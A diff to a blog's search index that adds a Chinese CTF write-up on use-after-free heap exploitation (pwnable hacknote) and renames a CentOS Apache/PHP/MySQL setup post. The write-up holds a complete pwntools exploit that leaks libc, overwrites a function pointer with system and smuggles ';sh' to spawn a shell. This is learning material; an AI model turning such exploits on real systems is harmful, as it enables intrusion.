@@ -1,8 +1,21 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[配置apache, php, mysql环境]]></title>
-    <url>%2F2021%2F09%2F16%2F%E9%85%8D%E7%BD%AEapache%2C%20php%2C%20mysql%E7%8E%AF%E5%A2%83%2F</url>
+    <title><![CDATA[use after free, 以hacknote为例]]></title>
+    <url>%2F2021%2F09%2F19%2Fuse%20after%20free%2C%20%E4%BB%A5hacknote%E4%B8%BA%E4%BE%8B%2F</url>
+    <content type="text"><![CDATA[前言最近学习了一波pwn堆溢出的use after free类型。现在来以一道例题pwnable_hacknote来加深巩固一下。use after free原理use after free利用得最多的是fastbin先进后出，是一个和free顺序反向的单链表，以及会优先分配满足大小的chunk给malloc。因为这些特性，我们可以连续free两个堆块a, b ，并malloc一个大小合适的堆块c，使得系统将a, b的空间分配给c（分配顺序为b，a），那么我们对c进行合理的溢出，使得能够控制堆块a，再使用题目提供的程序功能对堆块a进行操作（如打印等），造成数据泄露，getshell。Ida界面这个程序是一个标准的记事本类型，为32位程序。直接看函数：addshowdelete逻辑梳理值得注意的是，在add函数中，程序自定义了一个puts函数，输出的是参数地址的后四位的内容。这个程序可以分析得出，变量ptr是一个结构体，有两个成员，分别为一个函数指针，存放自定义puts；一个为content，存放输入数据。在delete函数中，free之后没有将指针置0，存在漏洞。对于这种结构的结构体，根据我的理解，use after free可以任意控制这两个成员为任意内容。即可以根据fastbin的特性，可以利用use after free来泄露函数地址、覆盖地址为system。Exp#coding=utf-8from pwn import *from LibcSearcher import *#context.log_level = 'DEBUG'#p = remote("chall.pwnable.tw",10102)p = remote("node4.buuoj.cn", 29156)elf = ELF('./hacknote')def add(size, content): p.recvuntil('choice :') p.sendline(str(1)) p.recvuntil('size :') p.sendline(str(size)) p.recvuntil('Content :') p.sendline(content) def delete(index): p.recvuntil('choice :') p.sendline(str(2)) p.recvuntil('Index :') p.sendline(str(index)) def show(index): p.recvuntil('choice :') p.sendline(str(3)) p.recvuntil('Index :') p.sendline(str(index)) puts_addr = 0x804862B atoi_got = elf.got['atoi']add(0x20, 'aaa')add(0x20, 'bbb')delete(0)delete(1) #此时fastbin指向：1-&gt;0payload = p32(puts_addr) + p32(atoi_got) #使用自定义的puts函数泄露后四位的地址， #即atoi地址add(0x8, payload) #依次分配chunk1前四位，chunk0前四位， #由于程序会把puts函数赋给chunk1前四位，于是使用payload溢出8位到 #chunk0show(0) #泄露atoi地址atoi_addr = u32(p.recv()[:4])libc = LibcSearcher('atoi', atoi_addr)libc_base = atoi_addr - libc.dump('atoi')system_addr = libc_base + libc.dump('system')delete(1) #这里free chunk1或者free chunk2都是一样的效果， #不改变都会指向chunk0的结果payload = p32(system_addr) + ';sh' add(0x8, payload) #再次溢出chunk0show(0) #此时执行atoi即为执行systemp.interactive()至于为什么使用;sh，是因为将函数指针由puts替换为了system，此时不会再往后读取4位。执行show函数即执行system(p32(system);sh)，这里的p32(system)并不是系统中的程序，所以会继续执行后面的sh。把分号换成其他符号如||、&amp;同样效果。总结遇到函数指针，可以考虑fastbin特性。仍需努力学习。]]></content>
+      <categories>
+        <category>心得小谈</category>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[centos配置apache, php, mysql环境]]></title>
+    <url>%2F2021%2F09%2F16%2Fcentos%E9%85%8D%E7%BD%AEapache%2C%20php%2C%20mysql%E7%8E%AF%E5%A2%83%2F</url>
     <content type="text"><![CDATA[前言最近有需求配环境，试了试lnmp、宝塔等等，也试过自行安装环境，但是要么占用空间太多，要么出各种问题，于是我摸索出了以下方法。舍弃了Nginx，拥抱Apache。虚拟机配置网络如果你的虚拟机没有ip地址，可能是没有启用网卡。这里的ens32是网卡名字，需要根据实际情况修改。cd /etc/sysconfig/network-scriptsvi ifcfg-ens32将ONBOOT=no改为yes保存后rebootip addr查看ip，使用ssh登录便于操作。下载并配置apache、phpyum install httpd设置开机自启systemctl enable httpd启动apachesystemctl start httpd安装phpyum install php php-devel重启apachesystemctl restart httpd下载并配置MySQL如果如下代码不可用，可以选择mariadb，命令操作和MySQL一模一样：yum install mysql mysql-server mysql-devel备选方案：yum install mariadb-server mariadb systemctl start mariadb如有需求，安装php的mysqli：yum install php-mysqli这样子的MySQL数据库安装后，是没有密码的，需要自行修改。修改MySQL root密码mysql -uroot；use mysql;update user set password=PASSWORD("your password.") where user='root';flush privileges;最后重启MySQL，mariadb同样命令：systemctl restart mysqld]]></content>
       <categories>
         <category>杂记</category>
